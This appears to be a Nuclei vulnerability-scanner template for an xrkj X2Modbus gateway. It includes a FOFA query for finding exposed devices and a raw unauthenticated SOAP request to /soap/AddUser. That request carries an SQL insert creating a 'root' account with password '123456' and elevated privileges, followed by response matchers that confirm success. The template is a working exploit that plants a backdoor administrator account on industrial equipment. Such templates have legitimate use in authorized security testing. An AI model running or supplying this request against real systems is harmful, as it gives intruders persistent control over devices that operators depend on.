id: xrkj-X2Modbus-AddUser

info:
  name: xrkj-X2Modbus-AddUser
  author: lengmo
  severity: high
  description: xrkj-X2Modbus-AddUser
  tags: AddUser
  metadata:
    fofa-qeury: server="SunFull-Webs"
    veified: true
    max-request: 1

http:
  - raw:
      - |
        POST /soap/AddUser HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
        Accept: application/xml, text/xml, */*; q=0.01
        Content-Type: text/xml; charset=utf-8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        X-Requested-With: XMLHttpRequest
 
        insert into userid (USERNAME,PASSWORD,PURVIEW,LOGINDATE,LOGINTIME) values('root','123456','4','2024-5-6','11:7:56')


               
    matchers:     
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body,'AdduserResult Execute=') && contains(body,'soap:Body') && contains(header,'text/xml')" 